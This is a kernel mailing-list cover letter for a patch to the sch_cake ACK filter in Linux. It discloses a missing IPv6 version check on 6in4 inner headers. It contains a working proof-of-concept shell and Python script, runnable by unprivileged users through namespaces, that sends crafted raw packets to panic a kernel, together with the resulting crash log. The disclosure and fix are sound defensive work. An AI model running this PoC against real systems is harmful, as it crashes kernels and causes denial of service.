Received: from mail-pg1-f169.google.com (mail-pg1-f169.google.com [209.85.215.169])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 2385B435AB5
	for <netdev@vger.kernel.org>; Mon, 27 Jul 2026 17:03:50 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.215.169
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785171836; cv=none; b=WZ0VUdolZYz7znrQBugCSstiRI5d3LTp4InG0mdy+mV9TsS2sbA3Ghb3YYe/0/oHbk0/GUZfBNwAVpQdCBFhfEIv1clBWjCX3iQjcwedKpwqDaS5xDpCWz5bwx7dIf898uHW2IbsKYunxD56jSpbWPm0Y7CHg8vvEj9ZGJQJ1fw=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785171836; c=relaxed/simple;
	bh=SFYfvdTzoyxia/qDZ7+franCstCagUY0AhTNCEXvWdA=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=q3YxDL2nxcf9MPbv3VoyL8x8k7zelJ+RrE9VBPa23BIQM8MaIPYIaBdyF6UDFfpN/US3t8P8aDWQ2wOpOgK+VFEeGLttx1CYeLLf4w7xPl8AI9bavNYUP4RTtXtMdBqeFt/a5V4nnfJkSC6gnNpXq5/sJESINhTmus/K3Yaho+s=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=ihKxR/TL; arc=none smtp.client-ip=209.85.215.169
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="ihKxR/TL"
Received: by mail-pg1-f169.google.com with SMTP id 41be03b00d2f7-ca97d139d8dso1690624a12.2
        for <netdev@vger.kernel.org>; Mon, 27 Jul 2026 10:03:50 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1785171830; x=1785776630; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=v7mGTmbWvHoeQ9h7R/0N4ykTmt2GYD/jipEnmXPYUH8=;
        b=ihKxR/TLaISmI/bo5MeW9aZbYYR3GqRhs18Swbhi8+YtWyr08nvIJQf7AykQyuiwaS
         ceXhO7aYbDerRIVCKRYJ5TTwx+GC5jVS64gzQfT2isi+sAsmrE2H7E8dyCV8Rz3m7cFe
         38+91AkGZ4m7cNKos3nD+Kh1bs0cAwuZl0L1Dzab+/YMdKFl1zuzgfNn0SZujRVqm2ov
         441CeXRC3AZ2V2RwWhqygny88rRdPL+JRa+VXGP3LZLranSY9ECKC2oPoRDyom9yjjNI
         axA5vlbF6bB0iULv8v0OOiN6Oy9TkMkjNXoCfDaBDtx3FiAyQ+CHHqREZGOHY2RLkdRk
         LHuA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785171830; x=1785776630;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=v7mGTmbWvHoeQ9h7R/0N4ykTmt2GYD/jipEnmXPYUH8=;
        b=BwCJmTHvqvjhi8+PaJPGVlV4Wplt3MfjgnYBgnXoymjXt3kcZ/pPS3EMubSNuW3ule
         aIpzM7Xc93GuwI62rmyoT98g/OzNaE5lW4hJcATTeSpGtMEJq0CM5+Lx71fZ7kWM0WkZ
         CRpYLvCatvNFGkxLffHhvqGGDFXZn7W5HblWW4973/UgtVLmCpWmd6LwlzQLobRT3dpr
         V3oT5j20n0JYTxPm0k8vrytEfrmCUsH4/4gCkH9BCkZYDScKgqMcywVyHJ8ucRIk1FFC
         haWMmntEIMZ4UQ58e/2SrAITa/nc6BlJhxHdUwKD1dC0XXdx61db5H4rNUfYiX4R/aHJ
         On5w==
X-Forwarded-Encrypted: i=1; AHgh+RpGr3hbT+aTP0j1c+3IBgfklZO/WP8Ly9Mw5p8fKFNp118Sm0nR+hbjk20+jGNXjAvkiHMDgmg=@vger.kernel.org
X-Gm-Message-State: AOJu0YwYVQVRFLn6NmF+7wa5jzdflfDc1mBlF4dSkwcouvKUisHdrLk1
	ybd3+ZUmgUr/1JPcM3LxIutgxzyMKbja9aZb1D/vRw3xatFTtLv4Wl4MZcV/jjIkKYI=
X-Gm-Gg: AR+sD13HI3HRu524veI+ZQG33eZRLGP/ZTHQs+CGHpWyAwyTsBxo0DcMhXY7fuaZ+VI
	dYwShIULK4JEWDehZmArZTrYAtMot1+wz4HJkd2J1kSKg+SJ59zQsgtOlLECMWEXp7jw+oKiOVn
	MrhmSLIsvYi+ckY/fCOF2M10OBd1o+mreB7QufMQgW/n7vkc1KPPZh94DAwtXattFJiI36wSiG+
	hIzcWt0Qy5M8Kz8vW3U1n45VsLLWlGF2gYksOUGdQF5A+JVAqjt77RjXDdeG9+/XSLelP59rsgR
	UqF4OnPGNOze1T1iGmOUlRZxMhQ0Bu7ip3hThj7j1JRVf1P1LYMQHnfIj0qIo1g0ZYM3NBitUKM
	TzpBpnxtIpdjS7DWbew4hn5Tya9Txi74fjGX8KO5dmaJOkLgN5NSpY7U0ExwOLnmVd57WrWdvA1
	PZMcEg27U70Y3xvy0YN/U4LTpaWuKbn/xfQVa+evS+ACUS/TKDWZY+XeM9StSn2iU+60LEP64U5
	RPsEFs=
X-Received: by 2002:a05:6a21:99a6:b0:3c3:7dfd:22c6 with SMTP id adf61e73a8af0-3c67e0b9e3emr8423919637.73.1785171829788;
        Mon, 27 Jul 2026 10:03:49 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([219.141.235.82])
        by smtp.gmail.com with ESMTPSA id 41be03b00d2f7-cbbb66e0ccdsm3546131a12.32.2026.07.27.10.03.46
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 27 Jul 2026 10:03:49 -0700 (PDT)
From: Ren Wei <enjou1224z@gmail.com>
To: cake@lists.bufferbloat.net,
	netdev@vger.kernel.org
Cc: toke@toke.dk,
	jhs@mojatatu.com,
	jiri@resnulli.us,
	davem@davemloft.net,
	edumazet@google.com,
	pabeni@redhat.com,
	horms@kernel.org,
	vega@nebusec.ai,
	zhilinz@nebusec.ai,
	enjou1224z@gmail.com
Subject: [PATCH net 0/1] net/sched: sch_cake: validate 6in4 inner headers
Date: Tue, 28 Jul 2026 01:03:40 +0800
Message-ID: <cover.1784855599.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.51.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Zhiling Zou <zhilinz@nebusec.ai>

Hi Linux kernel maintainers,

We found and validated an issue in net/sched/sch_cake.c. The bug is
reachable by a non-root user via user and net namespace when CAKE is
configured with ACK filtering.

We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

CAKE's ACK filter parses TCP headers from IPv4, IPv6 and 6in4 packets.
For IPv4 packets with protocol 41, cake_get_tcphdr() treats the bytes
after the outer IPv4 header as an IPv6 header if the inner nexthdr byte
is TCP. cake_get_iphdr() likewise returns that inner header to the ACK
filter.

Neither helper verifies that the encapsulated header actually has IPv6
version 6. The reproducer sets the first inner-header byte to 0x05,
which makes the IPv6 version field 0 while still setting the nexthdr
byte to TCP. Once two packets from the same flow are queued,
cake_ack_filter() compares their IP headers and reaches the version
switch that only handles IPv4 and IPv6. The malformed inner version
then hits WARN_ON(1), which panics kernels booted with panic_on_warn=1.

The fix rejects 6in4 packets unless the encapsulated header has IPv6
version 6 in both the IP-header and TCP-header parsing helpers.

Reproducer:

    unshare -Urn ./poc.sh

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.sh------

#!/bin/sh
set -eu

export PATH=/usr/sbin:/usr/bin:/sbin:/bin

IFACE="${IFACE:-veth0}"
PEER="${PEER:-veth1}"
COUNT="${COUNT:-20}"
RATE="${RATE:-1kbit}"

ip link add "$IFACE" type veth peer name "$PEER"
ip link set lo up
ip link set "$IFACE" up
ip link set "$PEER" up
tc qdisc add dev "$IFACE" root cake bandwidth "$RATE" flowblind ack-filter

python3 - "$IFACE" "$PEER" "$COUNT" <<'PY'
import fcntl
import socket
import struct
import sys

iface, peer, count = sys.argv[1], sys.argv[2], int(sys.argv[3])

def csum(data):
    if len(data) & 1:
        data += b"\x00"
    total = 0
    for i in range(0, len(data), 2):
        total += (data[i] << 8) + data[i + 1]
    while total >> 16:
        total = (total & 0xffff) + (total >> 16)
    return (~total) & 0xffff

def mac(name):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ifreq = struct.pack("16sH14s", name.encode(), socket.AF_UNIX, b"" * 14)
    res = fcntl.ioctl(s.fileno(), 0x8927, ifreq)
    return res[18:24]

src = mac(iface)
dst = mac(peer)

eth = dst + src + struct.pack("!H", 0x0800)

outer_wo = struct.pack(
    "!BBHHHBBH4s4s",
    0x45,
    0,
    80,
    0x1234,
    0,
    64,
    41,
    0,
    socket.inet_aton("192.0.2.1"),
    socket.inet_aton("192.0.2.2"),
)
outer = outer_wo[:10] + struct.pack("!H", csum(outer_wo)) + outer_wo[12:]

inner = bytearray(40)
inner[0] = 0x05
inner[6] = 6
inner[8:24] = bytes.fromhex("20010db8000000000000000000000001")
inner[24:40] = bytes.fromhex("20010db8000000000000000000000002")

tcp = bytearray(20)
struct.pack_into("!HHII", tcp, 0, 10000, 20000, 0, 1)
tcp[12] = 5 << 4
tcp[13] = 0x10

pkt = eth + outer + inner + tcp

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
s.bind((iface, 0))
for _ in range(count):
    s.send(pkt)

print(f"sent {len(pkt)} bytes x {count}")
PY

------END poc.sh--------

----BEGIN crash log----

[  342.881985][T10039] Kernel panic - not syncing: kernel: panic_on_warn set ...
[  342.882788][T10039] CPU: 0 UID: 1028 PID: 10039 Comm: python3 Tainted: G        W           7.1.0-rc1 #2 PREEMPT(full)
[  342.883469][T10039] Tainted: [W]=WARN
[  342.883722][T10039] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  342.884395][T10039] Call Trace:
[  342.884604][T10039]  <TASK>
[  342.884805][T10039]  vpanic (/home/roxy/linux-block-patch/build/../kernel/panic.c:734)
[  342.885074][T10039]  ? __pfx_vpanic (/home/roxy/linux-block-patch/build/../kernel/panic.c:361)
[  342.885373][T10039]  ? cake_ack_filter.isra.0 (/home/roxy/linux-block-patch/build/../net/sched/sch_cake.c:1171 /home/roxy/linux-block-patch/build/../net/sched/sch_cake.c:1305)
[  342.885732][T10039]  panic (/home/roxy/linux-block-patch/build/../kernel/panic.c:787)
[  342.885975][T10039]  ? __pfx_panic (/home/roxy/linux-block-patch/build/../kernel/panic.c:740)
[  342.886279][T10039]  check_panic_on_warn (/home/roxy/linux-block-patch/build/../kernel/panic.c:527 (discriminator 1))
[  342.886599][T10039]  __warn (/home/roxy/linux-block-patch/build/../kernel/panic.c:1101)
[  342.886847][T10039]  ? cake_ack_filter.isra.0 (/home/roxy/linux-block-patch/build/../net/sched/sch_cake.c:1171 /home/roxy/linux-block-patch/build/../net/sched/sch_cake.c:1305)
[  342.887202][T10039]  __report_bug (/home/roxy/linux-block-patch/build/../lib/bug.c:204 (discriminator 1))
[  342.887502][T10039]  ? __pfx___report_bug (/home/roxy/linux-block-patch/build/../lib/bug.c:73 (discriminator 5))
[  342.887834][T10039]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  342.888189][T10039]  ? __lock_acquire (/home/roxy/linux-block-patch/build/../kernel/locking/lockdep.c:4674 /home/roxy/linux-block-patch/build/../kernel/locking/lockdep.c:5191)
[  342.888506][T10039]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  342.888872][T10039]  ? cake_ack_filter.isra.0 (/home/roxy/linux-block-patch/build/../net/sched/sch_cake.c:1171 /home/roxy/linux-block-patch/build/../net/sched/sch_cake.c:1305)
[  342.889228][T10039]  report_bug (/home/roxy/linux-block-patch/build/../include/linux/context_tracking.h:149 (discriminator 1) /home/roxy/linux-block-patch/build/../lib/bug.c:277 (discriminator 1))
[  342.889497][T10039]  ? cake_ack_filter.isra.0 (/home/roxy/linux-block-patch/build/../net/sched/sch_cake.c:1171 /home/roxy/linux-block-patch/build/../net/sched/sch_cake.c:1305)
[  342.889867][T10039]  handle_bug (/home/roxy/linux-block-patch/build/../arch/x86/kernel/traps.c:436)
[  342.890147][T10039]  exc_invalid_op (/home/roxy/linux-block-patch/build/../arch/x86/kernel/traps.c:490 (discriminator 1))
[  342.890439][T10039]  asm_exc_invalid_op (/home/roxy/linux-block-patch/build/../arch/x86/include/asm/idtentry.h:616)
[  342.890749][T10039] RIP: 0010:cake_ack_filter.isra.0 (/home/roxy/linux-block-patch/build/../net/sched/sch_cake.c:1171 /home/roxy/linux-block-patch/build/../net/sched/sch_cake.c:1305)
[  342.891138][T10039] Code: 00 00 65 48 2b 05 d5 46 40 0a 0f 85 3d 0a 00 00 48 81 c4 a8 02 00 00 4c 89 d8 5b 5d 41 5c 41 5d 41 5e 41 5f e9 b9 77 3b f8 90 <0f> 0b 90 e9 be f7 ff ff 48 8b 45 10 49 39 45 10 0f 85 b0 f7 ff ff
All code
========
   0:	00 00                	add    %al,(%rax)
   2:	65 48 2b 05 d5 46 40 	sub    %gs:0xa4046d5(%rip),%rax        # 0xa4046df
   9:	0a 
   a:	0f 85 3d 0a 00 00    	jne    0xa4d
  10:	48 81 c4 a8 02 00 00 	add    $0x2a8,%rsp
  17:	4c 89 d8             	mov    %r11,%rax
  1a:	5b                   	pop    %rbx
  1b:	5d                   	pop    %rbp
  1c:	41 5c                	pop    %r12
  1e:	41 5d                	pop    %r13
  20:	41 5e                	pop    %r14
  22:	41 5f                	pop    %r15
  24:	e9 b9 77 3b f8       	jmp    0xfffffffff83b77e2
  29:	90                   	nop
  2a:*	0f 0b                	ud2		<-- trapping instruction
  2c:	90                   	nop
  2d:	e9 be f7 ff ff       	jmp    0xfffffffffffff7f0
  32:	48 8b 45 10          	mov    0x10(%rbp),%rax
  36:	49 39 45 10          	cmp    %rax,0x10(%r13)
  3a:	0f 85 b0 f7 ff ff    	jne    0xfffffffffffff7f0

Code starting with the faulting instruction
===========================================
   0:	0f 0b                	ud2
   2:	90                   	nop
   3:	e9 be f7 ff ff       	jmp    0xfffffffffffff7c6
   8:	48 8b 45 10          	mov    0x10(%rbp),%rax
   c:	49 39 45 10          	cmp    %rax,0x10(%r13)
  10:	0f 85 b0 f7 ff ff    	jne    0xfffffffffffff7c6
[  342.892336][T10039] RSP: 0018:ffa0000011727410 EFLAGS: 00010287
[  342.892725][T10039] RAX: 0000000000000000 RBX: ff110000701ab50c RCX: 0000000000000000
[  342.893225][T10039] RDX: 0000000000000007 RSI: ff110000701ab8cc RDI: 0000000000000004
[  342.893726][T10039] RBP: ff110000701ab8a4 R08: ffa0000011727328 R09: 0000000000000000
[  342.894211][T10039] R10: 0000000000000000 R11: 0000000000000000 R12: ff110001138a8c80
[  342.894710][T10039] R13: ff110000701ab4e4 R14: 00000000204e1027 R15: dffffc0000000000
[  342.895265][T10039]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  342.895629][T10039]  ? __pfx_cake_ack_filter.isra.0 (/home/roxy/linux-block-patch/build/../net/sched/sch_cake.c:2812)
[  342.896028][T10039]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  342.896377][T10039]  ? __lock_acquire (/home/roxy/linux-block-patch/build/../kernel/locking/lockdep.c:4674 /home/roxy/linux-block-patch/build/../kernel/locking/lockdep.c:5191)
[  342.896704][T10039]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  342.897051][T10039]  ? cake_overhead (/home/roxy/linux-block-patch/build/../net/sched/sch_cake.c:1451)
[  342.897363][T10039]  ? __pfx_cake_overhead (/home/roxy/linux-block-patch/build/../include/linux/skbuff.h:3253 (discriminator 1))
[  342.897699][T10039]  ? ktime_get (/home/roxy/linux-block-patch/build/../kernel/time/timekeeping.c:969 (discriminator 2))
[  342.897978][T10039]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  342.898335][T10039]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  342.898706][T10039]  cake_enqueue (/home/roxy/linux-block-patch/build/../net/sched/sch_cake.c:1823 (discriminator 2))
[  342.899004][T10039]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  342.899355][T10039]  ? __lock_acquire (/home/roxy/linux-block-patch/build/../kernel/locking/lockdep.c:4674 /home/roxy/linux-block-patch/build/../kernel/locking/lockdep.c:5191)
[  342.899700][T10039]  ? __pfx_cake_enqueue (/home/roxy/linux-block-patch/build/../include/linux/skbuff.h:1724)
[  342.900033][T10039]  __dev_queue_xmit (/home/roxy/linux-block-patch/build/../include/net/sch_generic.h:949 (discriminator 1) /home/roxy/linux-block-patch/build/../net/core/dev.c:4208 (discriminator 1) /home/roxy/linux-block-patch/build/../net/core/dev.c:4831 (discriminator 1))
[  342.900376][T10039]  ? __pfx___dev_queue_xmit (/home/roxy/linux-block-patch/build/../include/linux/netdevice.h:4010 (discriminator 1))
[  342.900728][T10039]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  342.901079][T10039]  ? _copy_from_iter (/home/roxy/linux-block-patch/build/../include/linux/iov_iter.h:296 /home/roxy/linux-block-patch/build/../include/linux/iov_iter.h:330 /home/roxy/linux-block-patch/build/../lib/iov_iter.c:261 /home/roxy/linux-block-patch/build/../lib/iov_iter.c:272)
[  342.901403][T10039]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  342.901762][T10039]  ? lock_acquire (/home/roxy/linux-block-patch/build/../kernel/locking/lockdep.c:5868 /home/roxy/linux-block-patch/build/../kernel/locking/lockdep.c:5825)
[  342.902063][T10039]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  342.902417][T10039]  ? find_held_lock (/home/roxy/linux-block-patch/build/../kernel/locking/lockdep.c:5350)
[  342.902723][T10039]  ? __pfx__copy_from_iter (/home/roxy/linux-block-patch/build/../include/linux/iov_iter.h:157)
[  342.903075][T10039]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  342.903427][T10039]  ? packet_parse_headers (/home/roxy/linux-block-patch/build/../include/linux/netdevice.h:3492 /home/roxy/linux-block-patch/build/../net/packet/af_packet.c:1930)
[  342.903781][T10039]  ? __pfx_packet_parse_headers (/home/roxy/linux-block-patch/build/../include/net/dst.h:285)
[  342.904143][T10039]  ? skb_copy_datagram_from_iter (/home/roxy/linux-block-patch/build/../arch/x86/include/asm/jump_label.h:37 /home/roxy/linux-block-patch/build/../include/linux/ucopysize.h:20 /home/roxy/linux-block-patch/build/../include/linux/ucopysize.h:59 /home/roxy/linux-block-patch/build/../include/linux/uio.h:227 /home/roxy/linux-block-patch/build/../net/core/datagram.c:561)
[  342.904532][T10039]  packet_sendmsg (/home/roxy/linux-block-patch/build/../include/linux/skbuff.h:3137 (discriminator 1) /home/roxy/linux-block-patch/build/../net/packet/af_packet.c:3030 (discriminator 1) /home/roxy/linux-block-patch/build/../net/packet/af_packet.c:3114 (discriminator 1))
[  342.904880][T10039]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  342.905241][T10039]  ? __pfx___might_resched (/home/roxy/linux-block-patch/build/../kernel/sched/core.c:5888 (discriminator 7))
[  342.905581][T10039]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  342.905946][T10039]  ? __lock_acquire (/home/roxy/linux-block-patch/build/../kernel/locking/lockdep.c:4674 /home/roxy/linux-block-patch/build/../kernel/locking/lockdep.c:5191)
[  342.906270][T10039]  ? __pfx_packet_sendmsg (/home/roxy/linux-block-patch/build/../arch/x86/include/asm/atomic.h:23)
[  342.906608][T10039]  ? __pfx_aa_sk_perm+0x10/0x10
[  342.906951][T10039]  __sys_sendto (/home/roxy/linux-block-patch/build/../net/socket.c:787 (discriminator 2) /home/roxy/linux-block-patch/build/../net/socket.c:802 (discriminator 2) /home/roxy/linux-block-patch/build/../net/socket.c:2265 (discriminator 2))
[  342.907241][T10039]  ? __pfx___sys_sendto (/home/roxy/linux-block-patch/build/../net/socket.c:2219)
[  342.907558][T10039]  ? __local_bh_enable_ip (/home/roxy/linux-block-patch/build/../kernel/softirq.c:457 (discriminator 1))
[  342.907905][T10039]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  342.908263][T10039]  ? lockdep_hardirqs_on (/home/roxy/linux-block-patch/build/../kernel/locking/lockdep.c:4472)
[  342.908605][T10039]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  342.908964][T10039]  ? __sys_bind (/home/roxy/linux-block-patch/build/../net/socket.c:1933 (discriminator 2) /home/roxy/linux-block-patch/build/../net/socket.c:1925 (discriminator 2) /home/roxy/linux-block-patch/build/../net/socket.c:1964 (discriminator 2))
[  342.909293][T10039]  __x64_sys_sendto (/home/roxy/linux-block-patch/build/../net/socket.c:2272 /home/roxy/linux-block-patch/build/../net/socket.c:2268 /home/roxy/linux-block-patch/build/../net/socket.c:2268)
[  342.909599][T10039]  ? do_syscall_64 (/home/roxy/linux-block-patch/build/../include/linux/entry-common.h:177 /home/roxy/linux-block-patch/build/../arch/x86/entry/syscall_64.c:89)
[  342.909909][T10039]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  342.910264][T10039]  ? lockdep_hardirqs_on (/home/roxy/linux-block-patch/build/../kernel/locking/lockdep.c:4472)
[  342.910593][T10039]  do_syscall_64 (/home/roxy/linux-block-patch/build/../arch/x86/entry/syscall_64.c:63 /home/roxy/linux-block-patch/build/../arch/x86/entry/syscall_64.c:94)
[  342.910889][T10039]  ? irqentry_exit (/home/roxy/linux-block-patch/build/../include/linux/irq-entry-common.h:280 /home/roxy/linux-block-patch/build/../include/linux/irq-entry-common.h:325 /home/roxy/linux-block-patch/build/../kernel/entry/common.c:162)
[  342.911194][T10039]  entry_SYSCALL_64_after_hwframe (/home/roxy/linux-block-patch/build/../arch/x86/entry/entry_64.S:121)
[  342.911566][T10039] RIP: 0033:0x7f6d385c0687
[  342.911854][T10039] Code: 48 89 fa 4c 89 df e8 58 b3 00 00 8b 93 08 03 00 00 59 5e 48 83 f8 fc 74 1a 5b c3 0f 1f 84 00 00 00 00 00 48 8b 44 24 10 0f 05 <5b> c3 0f 1f 80 00 00 00 00 83 e2 39 83 fa 08 75 de e8 23 ff ff ff
All code
========
   0:	48 89 fa             	mov    %rdi,%rdx
   3:	4c 89 df             	mov    %r11,%rdi
   6:	e8 58 b3 00 00       	call   0xb363
   b:	8b 93 08 03 00 00    	mov    0x308(%rbx),%edx
  11:	59                   	pop    %rcx
  12:	5e                   	pop    %rsi
  13:	48 83 f8 fc          	cmp    $0xfffffffffffffffc,%rax
  17:	74 1a                	je     0x33
  19:	5b                   	pop    %rbx
  1a:	c3                   	ret
  1b:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  22:	00 
  23:	48 8b 44 24 10       	mov    0x10(%rsp),%rax
  28:	0f 05                	syscall
  2a:*	5b                   	pop    %rbx		<-- trapping instruction
  2b:	c3                   	ret
  2c:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  33:	83 e2 39             	and    $0x39,%edx
  36:	83 fa 08             	cmp    $0x8,%edx
  39:	75 de                	jne    0x19
  3b:	e8 23 ff ff ff       	call   0xffffffffffffff63

Code starting with the faulting instruction
===========================================
   0:	5b                   	pop    %rbx
   1:	c3                   	ret
   2:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   9:	83 e2 39             	and    $0x39,%edx
   c:	83 fa 08             	cmp    $0x8,%edx
   f:	75 de                	jne    0xffffffffffffffef
  11:	e8 23 ff ff ff       	call   0xffffffffffffff39
[  342.913048][T10039] RSP: 002b:00007ffd3b5faa90 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
[  342.913567][T10039] RAX: ffffffffffffffda RBX: 00007f6d3852c780 RCX: 00007f6d385c0687
[  342.914072][T10039] RDX: 000000000000005e RSI: 00007f6d380334d0 RDI: 0000000000000003
[  342.914561][T10039] RBP: 0000000000000000 R08: 0000000000000000 R09: 0000000000000000
[  342.915058][T10039] R10: 0000000000000000 R11: 0000000000000202 R12: 0000000000000000
[  342.915554][T10039] R13: 0000000000000000 R14: 00000000006ff020 R15: 0000000000a83590
[  342.916081][T10039]  </TASK>
[  342.916721][T10039] Kernel Offset: disabled
[  342.917019][T10039] Rebooting in 86400 seconds..

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  net/sched: sch_cake: validate 6in4 inner headers

 net/sched/sch_cake.c | 18 +++++++++++-------
 1 file changed, 11 insertions(+), 7 deletions(-)

-- 
2.43.0
